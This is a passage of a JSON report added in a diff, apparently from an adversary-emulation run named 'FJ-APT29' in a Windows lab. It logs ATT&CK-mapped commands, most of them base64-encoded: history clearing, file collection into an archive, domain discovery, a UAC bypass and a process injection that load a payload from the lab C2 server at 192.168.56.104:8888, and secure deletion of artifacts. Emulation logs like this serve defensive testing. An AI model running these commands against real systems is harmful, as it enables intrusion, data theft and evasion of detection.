@@ -1,0 +1,4147 @@
+{
+  "name": "FJ-APT29",
+  "host_group": [
+    {
+      "origin_link_id": "",
+      "host_ip_addrs": [
+        "192.168.56.107",
+        "10.0.2.15"
+      ],
+      "proxy_receivers": {},
+      "links": [
+        {
+          "pin": 0,
+          "used": [],
+          "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "executor": {
+            "code": null,
+            "build_target": null,
+            "variations": [],
+            "uploads": [],
+            "parsers": [],
+            "additional_info": {},
+            "name": "psh",
+            "language": null,
+            "platform": "windows",
+            "cleanup": [],
+            "command": "Clear-History;Clear",
+            "payloads": [],
+            "timeout": 60
+          },
+          "pid": "4880",
+          "jitter": 0,
+          "agent_reported_time": "2022-09-29 19:23:25",
+          "status": 0,
+          "cleanup": 0,
+          "finish": "2022-09-29 19:23:25",
+          "collect": "2022-09-29 19:23:25",
+          "ability": {
+            "requirements": [],
+            "description": "Stop terminal from logging history",
+            "access": {},
+            "singleton": false,
+            "tactic": "defense-evasion",
+            "additional_info": {},
+            "name": "Avoid logs",
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "technique_id": "T1070.003",
+            "repeatable": false,
+            "executors": [
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "sh",
+                "language": null,
+                "platform": "darwin",
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "timeout": 60
+              },
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "sh",
+                "language": null,
+                "platform": "linux",
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "timeout": 60
+              },
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "psh",
+                "language": null,
+                "platform": "windows",
+                "cleanup": [],
+                "command": "Clear-History;Clear",
+                "payloads": [],
+                "timeout": 60
+              }
+            ],
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "privilege": null,
+            "plugin": "stockpile"
+          },
+          "decide": "2022-09-29 19:23:25",
+          "host": "win10",
+          "unique": "5d0a119e-c09a-4a2c-9556-c62b58e484a5",
+          "paw": "qfpaqy",
+          "score": 0,
+          "facts": [],
+          "id": "5d0a119e-c09a-4a2c-9556-c62b58e484a5",
+          "output": "False",
+          "deadman": false,
+          "relationships": [],
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          }
+        }
+      ],
+      "platform": "windows",
+      "ppid": 1732,
+      "executors": [
+        "cmd",
+        "psh",
+        "proc"
+      ],
+      "privilege": "Elevated",
+      "username": "WIN10\\vagrant",
+      "pid": 5476,
+      "sleep_max": 60,
+      "last_seen": "2022-09-29 20:22:46",
+      "deadman_enabled": true,
+      "group": "red",
+      "exe_name": "sandcat.go-windows.exe",
+      "contact": "HTTP",
+      "proxy_chain": [],
+      "sleep_min": 30,
+      "watchdog": 0,
+      "host": "win10",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "created": "2022-09-29 19:23:25",
+      "paw": "qfpaqy",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "pending_contact": "HTTP",
+      "architecture": "amd64",
+      "upstream_dest": "http://192.168.56.104:8888",
+      "display_name": "win10$WIN10\\vagrant",
+      "server": "http://192.168.56.104:8888",
+      "trusted": true
+    },
+    {
+      "origin_link_id": "",
+      "host_ip_addrs": [
+        "192.168.56.107",
+        "10.0.2.15"
+      ],
+      "proxy_receivers": {},
+      "links": [
+        {
+          "pin": 0,
+          "used": [],
+          "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "executor": {
+            "code": null,
+            "build_target": null,
+            "variations": [],
+            "uploads": [],
+            "parsers": [],
+            "additional_info": {},
+            "name": "psh",
+            "language": null,
+            "platform": "windows",
+            "cleanup": [],
+            "command": "Clear-History;Clear",
+            "payloads": [],
+            "timeout": 60
+          },
+          "pid": "4764",
+          "jitter": 0,
+          "agent_reported_time": "2022-09-29 19:47:50",
+          "status": 0,
+          "cleanup": 0,
+          "finish": "2022-09-29 19:47:51",
+          "collect": "2022-09-29 19:47:51",
+          "ability": {
+            "requirements": [],
+            "description": "Stop terminal from logging history",
+            "access": {},
+            "singleton": false,
+            "tactic": "defense-evasion",
+            "additional_info": {},
+            "name": "Avoid logs",
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "technique_id": "T1070.003",
+            "repeatable": false,
+            "executors": [
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "sh",
+                "language": null,
+                "platform": "darwin",
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "timeout": 60
+              },
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "sh",
+                "language": null,
+                "platform": "linux",
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "timeout": 60
+              },
+              {
+                "code": null,
+                "build_target": null,
+                "variations": [],
+                "uploads": [],
+                "parsers": [],
+                "additional_info": {},
+                "name": "psh",
+                "language": null,
+                "platform": "windows",
+                "cleanup": [],
+                "command": "Clear-History;Clear",
+                "payloads": [],
+                "timeout": 60
+              }
+            ],
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "privilege": null,
+            "plugin": "stockpile"
+          },
+          "decide": "2022-09-29 19:47:51",
+          "host": "win10",
+          "unique": "303c810e-fe5b-40d6-969f-68ac6993fb3c",
+          "paw": "wpouwj",
+          "score": 0,
+          "facts": [],
+          "id": "303c810e-fe5b-40d6-969f-68ac6993fb3c",
+          "output": "False",
+          "deadman": false,
+          "relationships": [],
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          }
+        }
+      ],
+      "platform": "windows",
+      "ppid": 6512,
+      "executors": [
+        "cmd",
+        "psh",
+        "proc"
+      ],
+      "privilege": "Elevated",
+      "username": "WIN10\\vagrant",
+      "pid": 4732,
+      "sleep_max": 60,
+      "last_seen": "2022-09-29 20:06:49",
+      "deadman_enabled": true,
+      "group": "diy_eval",
+      "exe_name": "sandcat.exe",
+      "contact": "HTTP",
+      "proxy_chain": [],
+      "sleep_min": 30,
+      "watchdog": 0,
+      "host": "win10",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "created": "2022-09-29 19:47:51",
+      "paw": "wpouwj",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "pending_contact": "HTTP",
+      "architecture": "amd64",
+      "upstream_dest": "http://192.168.56.104:8888",
+      "display_name": "win10$WIN10\\vagrant",
+      "server": "http://192.168.56.104:8888",
+      "trusted": false
+    }
+  ],
+  "start": "2022-09-29 19:31:11",
+  "steps": {
+    "qfpaqy": {
+      "steps": [
+        {
+          "link_id": "59d21d81-f621-4885-adc7-10075d3ab64c",
+          "ability_id": "a5daa530-c640-49bc-aa54-6808789a684a",
+          "command": "cG93ZXJzaGVsbC5leGU7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gUG93ZXJTaGVsbCBzdWNjZXNzZnVsbHkgc3Bhd25lZCI7ICBleGl0IDA7fQ==",
+          "delegated": "2022-09-29 19:31:11",
+          "run": "2022-09-29 19:31:27",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4736,
+          "description": "Spawn powershell.exe from cmd.exe",
+          "name": "PowerShell",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "agent_reported_time": "2022-09-29 19:31:24"
+        },
+        {
+          "link_id": "8bba03c6-a373-420b-ac6c-ea4f6decab39",
+          "ability_id": "5692da31-3586-4e4f-8f07-5750070c730b",
+          "command": "JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXERyYWZ0LlppcCAtRm9yY2U=",
+          "delegated": "2022-09-29 19:31:31",
+          "run": "2022-09-29 19:32:21",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3180,
+          "description": "Execute PowerShell from cmd.exe to collect and compress files of specific extensions.",
+          "name": "Automated Collection",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Automated Collection",
+            "technique_id": "T1119"
+          },
+          "agent_reported_time": "2022-09-29 19:31:59"
+        },
+        {
+          "link_id": "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+          "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+          "command": "aXBjb25maWcgL2FsbA==",
+          "delegated": "2022-09-29 19:32:26",
+          "run": "2022-09-29 19:33:01",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4160,
+          "description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.",
+          "name": "System Network Configuration Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "agent_reported_time": "2022-09-29 19:33:01"
+        },
+        {
+          "link_id": "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+          "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+          "command": "YXJwIC1h",
+          "delegated": "2022-09-29 19:33:06",
+          "run": "2022-09-29 19:33:40",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 1644,
+          "description": "The arp utility is executed via cmd to enumerate local ARP configuration information.",
+          "name": "System Network Configuration Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "agent_reported_time": "2022-09-29 19:33:40"
+        },
+        {
+          "link_id": "349e57ae-3489-4bfe-9f2e-f1538ded3c0a",
+          "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+          "command": "ZWNobyAlVVNFUkRPTUFJTiVcJVVTRVJOQU1FJQ==",
+          "delegated": "2022-09-29 19:33:42",
+          "run": "2022-09-29 19:34:42",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 2760,
+          "description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.",
+          "name": "System Owner / User Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Owner/User Discovery",
+            "technique_id": "T1033"
+          },
+          "agent_reported_time": "2022-09-29 19:34:42"
+        },
+        {
+          "link_id": "d4327eea-e657-44e9-8886-e8e9408809c8",
+          "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+          "command": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7UHJvY2Vzc0xpc3Q=",
+          "delegated": "2022-09-29 19:34:47",
+          "run": "2022-09-29 19:35:57",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4572,
+          "description": "API call(s) are executed to enumerate local running processes.",
+          "name": "Process Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 19:35:45"
+        },
+        {
+          "link_id": "919fa2b8-51cd-47fe-97b9-a1708ff64bb5",
+          "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+          "command": "dGFza2xpc3QgL3Y=",
+          "delegated": "2022-09-29 19:36:02",
+          "run": "2022-09-29 19:36:37",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4572,
+          "description": "The tasklist utility is executed via cmd to enumerate local running processes.",
+          "name": "Process Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 19:36:36"
+        },
+        {
+          "link_id": "9d1c3d3b-5bad-4d16-9886-4c9815b5b8c2",
+          "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+          "command": "c2MgcXVlcnk=",
+          "delegated": "2022-09-29 19:36:37",
+          "run": "2022-09-29 19:37:28",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 6672,
+          "description": "The sc utility is executed via cmd to enumerate local active services.",
+          "name": "System Service Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Service Discovery",
+            "technique_id": "T1007"
+          },
+          "agent_reported_time": "2022-09-29 19:37:28"
+        },
+        {
+          "link_id": "05be1c20-4a02-47cb-ba77-97639fcad3ee",
+          "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+          "command": "bmV0IHN0YXJ0",
+          "delegated": "2022-09-29 19:37:32",
+          "run": "2022-09-29 19:38:29",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4200,
+          "description": "The net utility is executed via cmd to enumerate local active services.",
+          "name": "System Service Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Service Discovery",
+            "technique_id": "T1007"
+          },
+          "agent_reported_time": "2022-09-29 19:38:28"
+        },
+        {
+          "link_id": "41ecafd7-c3c6-4f7d-a37e-3a6111300652",
+          "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+          "command": "c3lzdGVtaW5mbw==",
+          "delegated": "2022-09-29 19:38:33",
+          "run": "2022-09-29 19:39:15",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4664,
+          "description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration.",
+          "name": "System Information Discovery (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 19:39:13"
+        },
+        {
+          "link_id": "51fefacf-5e84-436a-b83f-37b86043f9a7",
+          "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+          "command": "bmV0IGNvbmZpZyB3b3Jrc3RhdGlvbg==",
+          "delegated": "2022-09-29 19:39:18",
+          "run": "2022-09-29 19:39:56",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 6260,
+          "description": "The net utility is executed via cmd to enumerate local operating system configuration.",
+          "name": "System Information Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 19:39:55"
+        },
+        {
+          "link_id": "3cc00a9e-8b78-4985-b9fa-267a5c1485d2",
+          "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+          "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=",
+          "delegated": "2022-09-29 19:39:58",
+          "run": "2022-09-29 19:40:37",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4772,
+          "description": "The net utility is executed via cmd to enumerate members of the local system's administrators group.",
+          "name": "Permissions Groups Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 19:40:36"
+        },
+        {
+          "link_id": "d521bbc3-96b8-40e8-8019-d8bd7a3e1b95",
+          "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+          "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2RvbWFpbg==",
+          "delegated": "2022-09-29 19:40:38",
+          "run": "2022-09-29 19:41:25",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 5392,
+          "description": "The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.",
+          "name": "Permissions Groups Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 19:41:24"
+        },
+        {
+          "link_id": "8dc3949a-954d-417a-b335-bf41c98a3662",
+          "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+          "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4=",
+          "delegated": "2022-09-29 19:41:28",
+          "run": "2022-09-29 19:42:21",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5908,
+          "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+          "name": "Permissions Groups Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 19:42:19"
+        },
+        {
+          "link_id": "13e18ff8-555c-4ac3-aa02-78a8fba7b6ff",
+          "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+          "command": "bmV0IHVzZXIgL2RvbWFpbg==",
+          "delegated": "2022-09-29 19:42:24",
+          "run": "2022-09-29 19:43:19",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 2600,
+          "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+          "name": "Account Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Account Discovery",
+            "technique_id": "T1087"
+          },
+          "agent_reported_time": "2022-09-29 19:43:18"
+        },
+        {
+          "link_id": "99822940-cadf-4d01-8483-13bf73987378",
+          "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+          "command": "bmV0IHVzZXIgJVVTRVJOQU1FJSAvZG9tYWlu",
+          "delegated": "2022-09-29 19:43:19",
+          "run": "2022-09-29 19:44:28",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 5744,
+          "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
+          "name": "Account Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Account Discovery",
+            "technique_id": "T1087"
+          },
+          "agent_reported_time": "2022-09-29 19:44:28"
+        },
+        {
+          "link_id": "647a8982-0c0e-4700-96da-4a054677500f",
+          "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+          "command": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt",
+          "delegated": "2022-09-29 19:44:29",
+          "run": "2022-09-29 19:45:10",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 3688,
+          "description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",
+          "name": "Query Registry (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Query Registry",
+            "technique_id": "T1012"
+          },
+          "agent_reported_time": "2022-09-29 19:45:10"
+        },
+        {
+          "link_id": "7af9f5df-990d-4e9d-b4c4-05e631a9b72c",
+          "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+          "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW52b2tlLUJ5cGFzc1VBQ1Rva2VuTWFuaXB1bGF0aW9uIC1Bcmd1bWVudHMgIi1ub3AgLWV4ZWMgYnlwYXNzIC1FbmNvZGVkQ29tbWFuZCAkcGNvZGUiIC1WZXJib3Nl",
+          "delegated": "2022-09-29 19:45:14",
+          "run": "2022-09-29 19:46:02",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5556,
+          "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+          "name": "Bypass User Account Control",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+            "technique_id": "T1134.001"
+          },
+          "agent_reported_time": "2022-09-29 19:46:00"
+        },
+        {
+          "link_id": "98fa2cf4-a194-49c3-924b-762c4495daba",
+          "ability_id": "5ff80022-8d85-410b-b868-6c7565b267e5",
+          "command": "UmVtb3ZlLUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIqIC1SZWN1cnNlIC1Gb3JjZTtpZiAoISh0ZXN0LXBhdGggLXBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIpKSB7ICB3cml0ZS1ob3N0ICJbK10gUmVnIGtleXMgcmVtb3ZlZCEiOyB9",
+          "delegated": "2022-09-29 19:46:05",
+          "run": "2022-09-29 19:46:52",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3924,
+          "description": "Delete registry entries post-UAC bypass.",
+          "name": "Registry Cleanup for UAC Bypass Technique",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Modify Registry",
+            "technique_id": "T1112"
+          },
+          "agent_reported_time": "2022-09-29 19:46:51"
+        },
+        {
+          "link_id": "a83b263e-46d8-4917-ab13-02f2f29a6a41",
+          "ability_id": "088b8639-3f37-42cc-9dc8-01aabb645461",
+          "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1QU0luamVjdC5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW5qZWN0IC1Qb3NoQ29kZSAkcGNvZGU7",
+          "delegated": "2022-09-29 19:46:55",
+          "run": "2022-09-29 19:47:49",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3104,
+          "description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.",
+          "name": "Process Injection",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Process Injection",
+            "technique_id": "T1055"
+          },
+          "agent_reported_time": "2022-09-29 19:47:41"
+        },
+        {
+          "link_id": "fa9994ef-cb80-4ef9-95db-4c717a981e76",
+          "ability_id": "59592c35-8207-4896-8d8b-36ad4600245d",
+          "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb250cm9sbGVycyIgL2RvbWFpbg==",
+          "delegated": "2022-09-29 19:47:50",
+          "run": "2022-09-29 19:48:34",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6044,
+          "description": "The net utility is executed via cmd to enumerate DCs within the domain",
+          "name": "Remote System Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Remote System Discovery",
+            "technique_id": "T1018"
+          },
+          "agent_reported_time": "2022-09-29 19:48:33"
+        },
+        {
+          "link_id": "82033708-e645-41ba-a903-717a1ec340e0",
+          "ability_id": "24ed020e-4730-4000-b6b4-6b5d3e95314f",
+          "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb21wdXRlcnMiIC9kb21haW4=",
+          "delegated": "2022-09-29 19:48:35",
+          "run": "2022-09-29 19:49:16",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4752,
+          "description": "The net utility is executed via cmd to enumerate hosts within the domain.",
+          "name": "Remote System Discovery (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Remote System Discovery",
+            "technique_id": "T1018"
+          },
+          "agent_reported_time": "2022-09-29 19:49:16"
+        },
+        {
+          "link_id": "f20185b5-71db-42f3-b484-079426326584",
+          "ability_id": "5f4263c4-7ff1-4098-b5f5-f41faa31cf5b",
+          "command": "bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcw==",
+          "delegated": "2022-09-29 19:49:20",
+          "run": "2022-09-29 19:50:02",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 512,
+          "description": "The netsh utility is executed via cmd to enumerate local firewall configuration information.",
+          "name": "System Network Configuration Discovery (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "agent_reported_time": "2022-09-29 19:50:01"
+        },
+        {
+          "link_id": "5d090652-0544-4a25-9723-13c904a0a8a3",
+          "ability_id": "646be6c9-f27a-4f5f-be5d-b8a0317e215f",
+          "command": "JHBzID0gZ2V0LXByb2Nlc3M7d3JpdGUtb3V0cHV0ICRwczs=",
+          "delegated": "2022-09-29 19:50:06",
+          "run": "2022-09-29 19:50:41",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 908,
+          "description": "List running process on the machine via PowerShell.",
+          "name": "Process Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 19:50:40"
+        },
+        {
+          "link_id": "af174dca-5499-4860-b514-24f919bd71b3",
+          "ability_id": "9b5b5aec-32ff-4d74-8555-727b50ab15f6",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiOykpIHsgIHdyaXRlLWhvc3QgIlshXSBUaGUgcGF0aCBDOlxQcm9ncmFtIEZpbGVzXFN5c0ludGVybmFsc1N1aXRlIGRvZXMgbm90IGV4aXN0LiBFeGVjdXRpb24gaGFzIHN0b3BwZWQuIjsgIGV4aXQgMTt9U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c0ludGVybmFsc1N1aXRlIjtnY2kgJGVudjp1c2VycHJvZmlsZVxEZXNrdG9wOy5cc2RlbGV0ZTY0LmV4ZSAvYWNjZXB0ZXVsYSAiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wXOKArmNvZC4zYWthMy5zY3IiOy5cc2RlbGV0ZTY0LmV4ZSAvYWNjZXB0ZXVsYSAiJGVudjpBUFBEQVRBXERyYWZ0LlppcCI7LlxzZGVsZXRlNjQuZXhlIC9hY2NlcHRldWxhICIkZW52OlVTRVJQUk9GSUxFXERvd25sb2Fkc1xTeXNJbnRlcm5hbHNTdWl0ZS56aXAiOw==",
+          "delegated": "2022-09-29 19:50:46",
+          "run": "2022-09-29 19:51:37",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7068,
+          "description": "Cleanup files related to Operation",
+          "name": "Artifact Cleanup - Delete Files",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Indicator Removal on Host: File Deletion",
+            "technique_id": "T1070.004"
+          },
+          "agent_reported_time": "2022-09-29 19:51:35"
+        },
+        {
+          "link_id": "42a04f7b-c8dc-4bb9-a5d0-dcd1a6ec2a39",
+          "ability_id": "6f1f4768-7099-45d2-a858-b49dc792234e",
